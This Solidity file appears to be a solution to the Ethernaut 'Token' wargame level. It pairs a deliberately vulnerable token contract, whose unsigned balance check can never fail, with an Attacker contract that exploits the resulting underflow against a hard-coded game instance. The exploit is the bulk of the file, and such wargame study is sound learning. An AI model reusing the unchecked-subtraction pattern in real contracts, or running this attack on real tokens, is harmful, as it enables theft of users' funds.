// SPDX-License-Identifier: MIT
pragma solidity ^0.6.7;

contract Token {
  mapping(address => uint256) balances;
  uint256 public totalSupply;

  constructor(uint256 _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
}

contract Attacker {
  Token public vulnerableContract = Token(0xcBF7c18252563811E588D0eb044e6Fcef45Fa536); // ethernaut vulnerable contract

  function attack() external payable {
    uint256 balance = vulnerableContract.balanceOf(msg.sender);
    vulnerableContract.transfer(msg.sender, balance);
    vulnerableContract.transfer(msg.sender, balance);
    vulnerableContract.transfer(msg.sender, balance);
    vulnerableContract.transfer(msg.sender, balance);
  }
}